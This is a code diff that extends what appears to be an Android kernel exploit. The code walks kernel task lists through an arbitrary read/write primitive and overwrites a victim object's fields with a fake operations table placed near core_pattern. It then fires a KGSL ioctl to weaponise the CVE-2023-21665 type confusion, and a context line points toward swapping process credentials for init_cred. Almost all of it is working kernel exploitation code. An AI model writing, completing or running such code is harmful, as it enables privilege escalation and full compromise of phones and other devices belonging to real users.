@@ -2,6 +2,24 @@
 #include "runtime_struct_offsets.h"
 #include <time.h>
 #include <signal.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+
+/* ABI for the in-process CVE-2023-21665 victim test. */
+struct drm_msm_gem_new  { uint64_t size; uint32_t flags; uint32_t handle; };
+struct drm_msm_gem_info { uint32_t handle; uint32_t flags; uint64_t offset; };
+struct drm_mode_create_dumb { uint32_t height, width, bpp, flags, handle, pitch; uint64_t size; };
+struct drm_mode_map_dumb { uint32_t handle, pad; uint64_t offset; };
+struct kgsl_map_user_mem {
+  int fd; unsigned long gpuaddr; size_t len; size_t offset;
+  unsigned long hostptr; unsigned int memtype; unsigned int flags;
+};
+#define DRM_IOCTL_MSM_GEM_NEW_  _IOWR('d', 0x42, struct drm_msm_gem_new)
+#define DRM_IOCTL_MSM_GEM_INFO_ _IOWR('d', 0x43, struct drm_msm_gem_info)
+#define DRM_IOCTL_CREATE_DUMB_  _IOWR('d', 0xb2, struct drm_mode_create_dumb)
+#define DRM_IOCTL_MAP_DUMB_     _IOWR('d', 0xb3, struct drm_mode_map_dumb)
+#define IOCTL_KGSL_MAP_USER_MEM_ _IOWR(0x09, 0x15, struct kgsl_map_user_mem)
+
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
   clock_gettime(CLOCK_MONOTONIC, &now);
@@ -1031,6 +1049,164 @@ int try_cfi_stage(void) {
                 (size_t)pm, (size_t)node, startbit, highbit,
                 nw, (size_t)rb0, rb1, errno);
         fsync(1);
+      }
+
+      /* Diagnostic: locate this process's file->private_data for an fd, to lay
+       * groundwork for heap-grooming a KGSL type-confusion victim (CVE-2023-21665).
+       * Reads only.  Scans task_struct for the `files` pointer (offset varies). */
+      {
+        int pfd = (int)fd;
+        const char *pfe = getenv("PROBE_FD");
+        if (pfe && *pfe) pfd = atoi(pfe);
+        uint32_t me = (uint32_t)getpid();
+        const char *pte = getenv("PROBE_TGID");
+        if (pte && *pte) me = (uint32_t)strtoul(pte, NULL, 0);
+        uintptr_t head = data_addr(INIT_TASK_TASKS);
+        uintptr_t canon = canon_addr(INIT_TASK_TASKS);
+        uint64_t entry = 0;
+        configfs_read_once(fd, head, &entry, sizeof(entry));
+        uintptr_t task = 0;
+        for (int i = 0; i < 8192; i++) {
+          if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
+          if (!is_direct_ptr(entry)) break;
+          uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
+          uint32_t pid = 0;
+          configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof(pid));
+          if (pid == me) { task = t; break; }
+          if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof(entry))
+              != (ssize_t)sizeof(entry)) break;
+        }
+        pr_info("probe: me=%u task=%016zx fd=%d\n",
+                me, (size_t)task, pfd);
+        if (is_direct_ptr(task)) {
+          for (uintptr_t tf = 0x840; tf <= 0x960; tf += 8) {
+            uint64_t P = 0;
+            configfs_read_once(fd, task + tf, &P, sizeof(P));
+            if (!is_direct_ptr(P)) continue;
+            uint64_t fdt = 0, fdarr = 0, file = 0, priv = 0;
+            configfs_read_once(fd, P + 0x20, &fdt, sizeof(fdt));
+            if (!is_direct_ptr(fdt)) continue;
+            configfs_read_once(fd, fdt + 0x8, &fdarr, sizeof(fdarr));
+            if (!is_direct_ptr(fdarr)) continue;
+            configfs_read_once(fd, fdarr + (uint64_t)pfd * 8, &file, sizeof(file));
+            if (!is_direct_ptr(file)) continue;
+            configfs_read_once(fd, file + 0xd0, &priv, sizeof(priv));
+            uint64_t q[8] = {0};
+            if (is_direct_ptr(priv)) configfs_read_once(fd, (uintptr_t)priv, q, sizeof(q));
+            pr_info("probe: tf=%03zx files=%016zx fdt=%016zx fdarr=%016zx file=%016zx priv=%016zx\n",
+                    (size_t)tf, (size_t)P, (size_t)fdt, (size_t)fdarr,
+                    (size_t)file, (size_t)priv);
+            pr_info("probe: priv[+00..+3f]=%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx\n",
+                    (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3],
+                    (size_t)q[4], (size_t)q[5], (size_t)q[6], (size_t)q[7]);
+            /* Optional: groom the victim so dma_buf_attach()/map_attachment()
+             * walk a controlled object instead of crashing in mutex_lock. */
+            const char *pp = getenv("PATCH");
+            if (pp && *pp && is_direct_ptr(priv)) {
+              uintptr_t A = (uintptr_t)priv;
+              uintptr_t ot = data_addr(CORE_PATTERN) + 64;   /* fake dma_buf_ops */
+              uint64_t self = (uint64_t)(A + 16);
+              uint64_t z = 0;
+              configfs_write_once(fd, A + 16, &self, 8);     /* attachments.next */
+              configfs_write_once(fd, A + 24, &self, 8);     /* attachments.prev */
+              configfs_write_once(fd, A + 40, &z, 8);        /* lock = unlocked */
+              for (int k = 0; k < 16; k++) configfs_write_once(fd, ot + k * 8, &z, 8);
+              configfs_write_once(fd, A + 32, &ot, 8);       /* ops -> fake table */
+              uint64_t q2[8] = {0};
+              configfs_read_once(fd, A, q2, sizeof(q2));
+              pr_info("probe: PATCHED ops_tbl=%016zx priv[%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx]\n",
+                      (size_t)ot, (size_t)q2[0], (size_t)q2[1], (size_t)q2[2],
+                      (size_t)q2[3], (size_t)q2[4], (size_t)q2[5], (size_t)q2[6],
+                      (size_t)q2[7]);
+            }
+          }
+        }
+        fsync(1);
+      }
+
+      /* In-process CVE-2023-21665 weaponisation test (KGSL_DRM=1):
+       * open /dev/dri/renderD128 (permitted now that SELinux is permissive),
+       * create a GEM + writable MAP_SHARED (-> vma->vm_file->private_data is a
+       * drm_file, not a dma_buf), locate+groom that object via arbitrary R/W,
+       * then fire IOCTL_KGSL_MAP_USER_MEM(ADDR) at it so we can see how far the
+       * type-confused object gets past mutex_lock(). */
+      {
+        const char *kd = getenv("KGSL_DRM");
+        if (kd && *kd) {
+          struct drm_mode_create_dumb cd; memset(&cd, 0, sizeof cd);
+          cd.width = 64; cd.height = 64; cd.bpp = 32;
+          struct drm_mode_map_dumb md; memset(&md, 0, sizeof md);
+          int dfd = open("/dev/dri/renderD128", O_RDWR);
+          pr_info("kgsl_drm: open renderD128=%d errno=%d\n", dfd, errno); fsync(1);
+          if (dfd >= 0) {
+            int r1 = ioctl(dfd, DRM_IOCTL_CREATE_DUMB_, &cd);
+            int r2 = -1; md.handle = cd.handle;
+            if (r1 == 0) r2 = ioctl(dfd, DRM_IOCTL_MAP_DUMB_, &md);
+            pr_info("kgsl_drm: create_dumb=%d handle=%u map_dumb=%d off=0x%llx size=%llu errno=%d\n",
+                    r1, cd.handle, r2, (unsigned long long)md.offset,
+                    (unsigned long long)cd.size, errno); fsync(1);
+            if (r2 == 0) {
+              void *p = mmap(NULL, cd.size, PROT_READ | PROT_WRITE, MAP_SHARED,
+                             dfd, md.offset);
+              pr_info("kgsl_drm: mmap=%p errno=%d\n", p, errno); fsync(1);
+              if (p != MAP_FAILED) {
+                uint32_t me = (uint32_t)getpid();
+                uintptr_t head = data_addr(INIT_TASK_TASKS);
+                uintptr_t canon = canon_addr(INIT_TASK_TASKS);
+                uint64_t entry = 0;
+                configfs_read_once(fd, head, &entry, sizeof(entry));
+                uintptr_t task = 0;
+                for (int i = 0; i < 8192; i++) {
+                  if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
+                  if (!is_direct_ptr(entry)) break;
+                  uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
+                  uint32_t pid = 0;
+                  configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof(pid));
+                  if (pid == me) { task = t; break; }
+                  if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof(entry))
+                      != (ssize_t)sizeof(entry)) break;
+                }
+                uintptr_t priv = 0;
+                uint64_t P = 0, fdt = 0, fdarr = 0, file = 0;
+                if (is_direct_ptr(task)) {
+                  configfs_read_once(fd, task + 0x880, &P, sizeof(P));
+                  if (is_direct_ptr(P)) configfs_read_once(fd, P + 0x20, &fdt, sizeof(fdt));
+                  if (is_direct_ptr(fdt)) configfs_read_once(fd, fdt + 0x8, &fdarr, sizeof(fdarr));
+                  if (is_direct_ptr(fdarr)) configfs_read_once(fd, fdarr + (uint64_t)dfd * 8, &file, sizeof(file));
+                  if (is_direct_ptr(file)) configfs_read_once(fd, file + 0xd0, &priv, sizeof(priv));
+                }
+                pr_info("kgsl_drm: task=%016zx dfd=%d files=%016zx fdt=%016zx fdarr=%016zx file=%016zx priv=%016zx\n",
+                        (size_t)task, dfd, (size_t)P, (size_t)fdt, (size_t)fdarr,
+                        (size_t)file, (size_t)priv);
+                if (is_direct_ptr(priv)) {
+                  uintptr_t A = (uintptr_t)priv;
+                  uintptr_t ot = data_addr(CORE_PATTERN) + 64;
+                  uint64_t self = (uint64_t)(A + 16), z = 0;
+                  configfs_write_once(fd, A + 16, &self, 8);
+                  configfs_write_once(fd, A + 24, &self, 8);
+                  configfs_write_once(fd, A + 40, &z, 8);
+                  for (int k = 0; k < 16; k++) configfs_write_once(fd, ot + k * 8, &z, 8);
+                  configfs_write_once(fd, A + 32, &ot, 8);
+                  uint64_t q[8] = {0};
+                  configfs_read_once(fd, A, q, sizeof(q));
+                  pr_info("kgsl_drm: patched [%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx]\n",
+                          (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3],
+                          (size_t)q[4], (size_t)q[5], (size_t)q[6], (size_t)q[7]);
+                }
+                fsync(1);
+                int gfd = open("/dev/kgsl-3d0", O_RDWR);
+                struct kgsl_map_user_mem m;
+                memset(&m, 0, sizeof m);
+                m.fd = dfd; m.len = cd.size; m.hostptr = (unsigned long)p; m.memtype = 2;
+                pr_info("kgsl_drm: firing KGSL ioctl gfd=%d hostptr=%p ...\n", gfd, p);
+                fsync(1);
+                int rr = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m);
+                pr_info("kgsl_drm: ioctl ret=%d errno=%d\n", rr, errno);
+                fsync(1);
+              }
+            }
+          }
+        }
       }
 
       /* Optional: repoint a target task's cred -> canonical init_cred. */
